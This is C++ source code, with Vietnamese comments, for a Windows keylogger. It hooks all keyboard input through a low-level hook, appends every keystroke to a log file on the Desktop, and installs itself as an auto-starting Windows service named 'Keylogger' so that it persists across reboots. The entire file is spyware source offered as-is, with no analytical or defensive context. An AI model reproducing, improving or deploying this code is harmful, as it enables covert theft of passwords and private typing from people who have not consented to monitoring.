#include <windows.h>
#include <shlobj.h>
#include <fstream>
#include <string>
#include <iostream>


using namespace std;

// ===CONFIG===
#define SERVICE_NAME L"Keylogger"
SERVICE_STATUS_HANDLE g_ServiceStatusHandle = NULL;
HANDLE g_ServiceStopEvent = NULL;

// Desktop Path file log
string DesktopPath() {
    char* home = nullptr;
    size_t len = 0;
    errno_t err = _dupenv_s(&home, &len, "USERPROFILE");
    if (err == 0 && home != nullptr) {
        string desktopPath = string(home) + "\\Desktop\\keylog.txt";
        free(home);
        return desktopPath;
    }
    else {
        return "keylog.txt"; // fallback if USERPROFILE is not set

    }
}

// Log key
void LogKeyStroke(int key) {
    string keyStr;
    if (key == VK_BACK) keyStr = "[BACKSPACE]";
    else if (key == VK_RETURN) keyStr = "[ENTER]\n";
    else if (key == VK_TAB) keyStr = "[TAB]";
    else if (key == VK_SHIFT) keyStr = "[SHIFT]";
    else if (key == VK_CONTROL) keyStr = "[CTRL]";
    else if (key == VK_ESCAPE) keyStr = "[ESCAPE]";
    else if (key == VK_SPACE) keyStr = " ";
    else if ((key >= 'A' && key <= 'Z') || (key >= 'a' && key <= 'z') || (key >= '0' && key <= '9'))
        keyStr = (char)key;
    else keyStr = "[ " + to_string(key) + " ]";

    // Log key ra file
    ofstream logFile(DesktopPath(), ios::app);
    logFile << keyStr;
    logFile.close();

}

LRESULT CALLBACK KeyBoardProcess(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        int key = pKeyBoard->vkCode;
        LogKeyStroke(key);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void KeyLoggerMain() {
    HHOOK KeyBoardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoardProcess, NULL, 0);
    MSG msg;
    while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0 && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    UnhookWindowsHookEx(KeyBoardHook);
}

void WINAPI ServiceCtrlHandler(DWORD ctrlCode) {
    switch (ctrlCode) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        if (g_ServiceStatusHandle) {
            SERVICE_STATUS status = { 0 };
            status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
            status.dwCurrentState = SERVICE_STOP_PENDING;
            SetServiceStatus(g_ServiceStatusHandle, &status);
        }
        SetEvent(g_ServiceStopEvent);
        break;
    default:
        break;
    }
}
// Main Entry point cua service
void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) {
    SERVICE_STATUS status = { 0 };
    g_ServiceStatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);

    status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    status.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(g_ServiceStatusHandle, &status);

    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    if(!g_ServiceStopEvent) {
        status.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_ServiceStatusHandle, &status);
        return;
	}

	status.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus(g_ServiceStatusHandle, &status);

    KeyLoggerMain();

    status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_ServiceStatusHandle, &status);
}

// Tu cai dat chuong trinh thanh service
void InstallService(const wchar_t* exePath) {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCM) {
        SC_HANDLE hService = CreateService(
            hSCM,
            SERVICE_NAME,
            SERVICE_NAME,
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            exePath,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL

        );
        if (hService) {
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);

    }

}

int wmain(int argc, wchar_t* argv[]) {
    if (argc == 1) {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        InstallService(exePath);
        wcout << "Service Installed" << endl;
        return 0;
    }

    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {(LPWSTR)SERVICE_NAME, ServiceMain},
        {NULL, NULL}
    };
    StartServiceCtrlDispatcher(ServiceTable);
    return 0;

}

